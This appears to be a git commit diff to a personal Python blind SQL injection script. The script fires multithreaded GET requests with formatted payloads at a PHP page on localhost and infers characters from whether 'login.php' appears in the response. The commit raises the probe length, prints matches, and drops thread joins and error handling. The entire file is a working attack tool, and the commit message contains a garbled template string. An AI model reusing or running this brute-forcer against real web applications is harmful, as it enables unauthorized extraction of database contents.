f7a264a68f53a34d464ef1de8339b687a2459b7b
whb54012 <1226844928@qq.com>
2026-07-27 11:56:18 +0000

    自动提交：更新 ${2026/7/27 19:56ilenPM56e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -1,29 +1,20 @@
 import requests
 import threading
 import warnings
-import time
 warnings.filterwarnings("ignore")
 # result=int(input("输入查找长度"))
-result=11
+result=100
 # url = input("输入url及注入点")
 url="http://localhost:3000/%E7%BD%91%E9%A1%B5/%E4%B8%BB%E9%A1%B5/%E9%9F%B3%E4%B9%90.php"
 # data=input("输入注入语句")
 data='?c=11{}{}123'
 def fun(url,result,result2):
     for i in range(result2):
-        # try:
         reponse=requests.get(url+data.format(result,i),timeout=0.5)
         if 'login.php' in reponse.text:
-            print(result,"          ")
+            print(result,url+data.format(result,i),chr(i)+"\n")
             break
-        # except:
-        #     print("error\n")
-        #     continue
     return
-threads=[]
 for  i in range(result):
     t=threading.Thread(target=fun,args=(url,i,150))
-    threads.append(t)
     t.start()
-for i in threads:      # 循环开始
-    i.join()
